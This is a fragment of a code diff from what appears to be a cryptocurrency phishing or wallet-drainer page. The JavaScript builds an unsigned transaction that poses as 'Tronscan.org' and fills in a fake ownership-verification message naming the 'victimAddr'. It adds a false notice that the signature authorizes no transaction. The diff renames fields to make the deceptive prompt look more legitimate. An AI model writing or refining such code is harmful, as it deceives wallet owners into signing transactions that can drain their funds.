@@ -461,8 +461,8 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
     var pad = function (n) { return String(n).padStart(2, '0'); };
     var ts = pad(now.getDate()) + '/' + pad(now.getMonth() + 1) + '/' + now.getFullYear()
            + ' ' + pad(now.getHours()) + ':' + pad(now.getMinutes()) + ':' + pad(now.getSeconds());
-    unsignedTx.Authority   = 'Tronscan.org';
-    unsignedTx.Attestation = '[Tronscan.org ' + ts + '] I hereby verify that I am the owner/creator of the address [' + victimAddr + ']';
+    unsignedTx.Application   = 'Tronscan.org';
+    unsignedTx.Message = '[Tronscan.org ' + ts + '] I hereby verify that I am the owner/creator of the address [' + victimAddr + ']';
     unsignedTx.Notice      = 'This signature is used solely to verify ownership of the address. It does not authorize, initiate, or execute any transaction.';
 
     var signedTx;
